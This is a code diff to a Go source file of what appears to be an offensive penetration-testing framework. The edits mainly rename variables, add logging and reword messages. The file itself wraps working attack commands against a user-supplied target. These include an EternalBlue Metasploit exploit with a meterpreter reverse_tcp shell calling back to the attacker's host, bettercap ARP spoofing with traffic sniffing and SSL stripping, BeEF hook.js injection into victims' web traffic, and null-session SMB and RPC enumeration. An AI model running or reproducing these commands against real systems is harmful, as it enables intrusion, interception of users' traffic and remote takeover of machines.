@@ -9,40 +9,42 @@ import (
     "io/ioutil"
     "bcolors"
     "menus"
+    "time"
     "subprocess"
 )
 
 var userInput, userTarget, userLhost, userLPort, userName, userPass string
 
 func InternalScanner() {
-    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; ticker on"`)
+    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`)
 }
 
 func NmapPortscan(userTarget string) {
-    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full port scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    subprocess.PopenTwo(`nmap -v -p- %s`, userTarget)
+    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full port scan on Target 🎯" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    Logs := fmt.Sprintf("/root/.africana/logs/nmap_full_ports_log_%s.txt", time.Now().Format("20060102_150405"))
+    subprocess.PopenThree(`script -q -c 'nmap -v -p- %s' -O %s`, userTarget, Logs)
     fmt.Println()
 }
 
 func NmapVulnscan(userTarget string) {
-    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full vuln scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full vuln scan on Target 🎯" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
     subprocess.PopenTwo(`nmap --open -T4 -Pn -n -sSV -p- --script=vulners.nse --stats-every 10s %s`, userTarget)
     fmt.Println()
 }
 
 func SmbVulnscan(userTarget string) {
-    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying smb nmap vuln scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing SMB vuln scan on Target 🎯" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
     subprocess.PopenTwo(`nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s`, userTarget)
 }
 
 func SmbMapscan(userTarget string) {
-    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying full smb mapping on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full SMB maping on Target 🎯" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
     subprocess.PopenTwo(`smbmap -H %s -u null -p null -r --depth 5`, userTarget)
     fmt.Println()
 }
 
 func RpcEnumscan(userTarget string) {
-    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying rpc null user & pass connection on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing null RPC connectin on Target 🎯" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
     subprocess.PopenTwo(`rpcclient -U "" -N %s`, userTarget)
     fmt.Println()
 }
@@ -76,7 +78,7 @@ func SmbExploit(userTarget string) {
             userLhost = userLhostIp
         }
         fmt.Println()
-        subprocess.PopenFour(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j"`, userTarget, userLhostIp, userLport)
+        subprocess.PopenFour(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j"`, userTarget, userLhost, userLport)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
@@ -93,7 +95,7 @@ func PacketSniffer(userTarget string) {
     case "1":
         subprocess.PopenTwo(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`, userTarget)
     case "2":
-        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`)
+        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on"`)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
@@ -187,7 +189,7 @@ func BeefBettercap(userTarget string) {
             userLhost = userLhostIp
         }
         fmt.Println()
-        subprocess.PopenFive(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true"`, userLhostIp, userLhostIp, userTarget, userLhostIp)
+        subprocess.PopenFive(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userLhost, userTarget, userLhost)
         fmt.Println()
         subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
         fmt.Println()
@@ -227,7 +229,7 @@ func BeefBettercap(userTarget string) {
             userLhost = userLhostIp
         }
         fmt.Println()
-        subprocess.PopenFour(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true"`, userLhostIp, userLhostIp, userLhostIp)
+        subprocess.PopenFour(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userLhost, userLhost)
         fmt.Println()
         subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
     default:
